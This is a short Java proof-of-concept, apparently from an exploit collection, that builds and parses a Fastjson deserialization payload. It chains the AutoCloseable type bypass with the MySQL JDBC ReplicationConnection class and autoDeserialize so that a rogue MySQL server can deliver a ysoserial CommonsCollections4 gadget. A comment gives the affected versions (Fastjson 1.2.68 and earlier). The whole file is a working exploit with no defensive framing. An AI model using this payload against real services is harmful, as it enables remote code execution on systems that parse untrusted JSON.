package test;

import com.alibaba.fastjson.JSON;

public class Fastjson12_mysql_1 {
  	//<=1.2.68 and mysql 5.0.2-5.1.5 ½öSSRF
    public static void main(String[] args) throws Exception{
        String payload = "{\r\n"
        		+ "	\"@type\": \"java.lang.AutoCloseable\",\r\n"
        		+ "	\"@type\": \"com.mysql.jdbc.ReplicationConnection\",\r\n"
        		+ "	\"masterProperties\": {\r\n"
        		+ "		\"HOST\": \"127.0.0.1\",\r\n"
        		+ "		\"user\": \"yso_CommonsCollections4_calc\",\r\n"
        		+ "		\"password\": \"pass\",\r\n"
        		+ "		\"statementInterceptors\": \"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\",\r\n"
        		+ "		\"autoDeserialize\": \"true\"\r\n"
        		+ "	},\r\n"
        		+ "	\"slaveProperties\": {\r\n"
        		+ "		\"HOST\": \"127.0.0.1\",\r\n"
        		+ "		\"user\": \"yso_CommonsCollections4_calc\",\r\n"
        		+ "		\"password\": \"pass\",\r\n"
        		+ "		\"statementInterceptors\": \"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\",\r\n"
        		+ "		\"autoDeserialize\": \"true\"\r\n"
        		+ "	}\r\n"
        		+ "}\r\n"
        		+ "";
        System.out.println(payload);
    	JSON.parseObject(payload);
    }
}
